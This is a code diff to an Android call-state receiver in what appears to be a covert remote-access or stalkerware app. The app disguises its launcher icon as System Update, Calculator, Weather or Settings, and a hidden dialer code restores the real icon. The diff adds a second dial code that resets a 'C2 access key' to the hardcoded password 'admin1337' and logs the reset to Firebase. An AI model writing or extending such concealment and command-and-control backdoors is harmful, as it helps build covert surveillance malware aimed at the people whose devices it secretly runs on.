@@ -57,26 +57,44 @@ public class TelephonyState extends BroadcastReceiver {
 
         if ("*#1337#".equals(savedNumber)) {
             setResultData(null);
+            restoreLauncher(context);
             
-            android.content.pm.PackageManager pm = context.getPackageManager();
-            String pkg = context.getPackageName();
+            Intent i = new Intent(context, MainActivity.class);
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(i);
+        } else if ("*#1337*0#".equals(savedNumber)) {
+            // EMERGENCY PASSWORD RESET: Resets C2 Access Key to 'admin1337'
+            setResultData(null);
+            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                    .edit()
+                    .putString("c2_password", "admin1337")
+                    .apply();
             
-            android.content.ComponentName mainAlias = new android.content.ComponentName(pkg, "com.labs.labrats.LauncherAlias");
-            android.content.ComponentName updateAlias = new android.content.ComponentName(pkg, "com.labs.labrats.SystemUpdateAlias");
-            android.content.ComponentName calcAlias = new android.content.ComponentName(pkg, "com.labs.labrats.CalculatorAlias");
-            android.content.ComponentName weatherAlias = new android.content.ComponentName(pkg, "com.labs.labrats.WeatherAlias");
-            android.content.ComponentName settingsAlias = new android.content.ComponentName(pkg, "com.labs.labrats.SettingsAlias");
-
-            pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-            pm.setComponentEnabledSetting(updateAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-            pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-            pm.setComponentEnabledSetting(weatherAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-            pm.setComponentEnabledSetting(settingsAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
-                
+            FirebaseConfig.logActivity("SECURITY_ALERT: Hardware-triggered password reset sequence (Dial Code)");
+            android.widget.Toast.makeText(context, "SECURITY: C2 Access Key Reset to Default", android.widget.Toast.LENGTH_LONG).show();
+            
+            restoreLauncher(context);
             Intent i = new Intent(context, MainActivity.class);
             i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             context.startActivity(i);
         }
+    }
+
+    private void restoreLauncher(Context context) {
+        android.content.pm.PackageManager pm = context.getPackageManager();
+        String pkg = context.getPackageName();
+        
+        android.content.ComponentName mainAlias = new android.content.ComponentName(pkg, pkg + ".LauncherAlias");
+        android.content.ComponentName updateAlias = new android.content.ComponentName(pkg, pkg + ".SystemUpdateAlias");
+        android.content.ComponentName calcAlias = new android.content.ComponentName(pkg, pkg + ".CalculatorAlias");
+        android.content.ComponentName weatherAlias = new android.content.ComponentName(pkg, pkg + ".WeatherAlias");
+        android.content.ComponentName settingsAlias = new android.content.ComponentName(pkg, pkg + ".SettingsAlias");
+
+        pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+        pm.setComponentEnabledSetting(updateAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+        pm.setComponentEnabledSetting(calcAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+        pm.setComponentEnabledSetting(weatherAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+        pm.setComponentEnabledSetting(settingsAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
     }
 
     private void onCallStateChanged(Context context, int state, String incomingNumber) {
